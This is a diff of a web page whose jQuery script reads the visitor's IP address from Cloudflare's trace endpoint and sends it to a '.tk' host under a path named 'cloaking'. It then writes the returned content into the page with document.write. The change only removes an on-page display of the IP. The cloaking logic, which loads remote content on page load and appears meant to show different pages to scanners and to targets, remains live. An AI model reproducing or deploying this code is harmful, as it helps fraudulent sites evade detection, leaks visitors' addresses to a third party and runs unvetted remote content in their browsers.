@@ -8,7 +8,7 @@ $( document ).ready(function() {
     $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
         var patlat = data.split("\n");
         var bidapatlat = patlat[2].split("=")[1];
-		$("#goster").html(bidapatlat);
+		
 		$.get('https://ckargo.tk/cloaking/deneme.php?ip='+bidapatlat, function(data) {
 			document.write(data);
 			});
@@ -17,6 +17,5 @@ $( document ).ready(function() {
 </script>
 </head>
 <body>
-<div id="goster"></div>
 </body>
 </html>
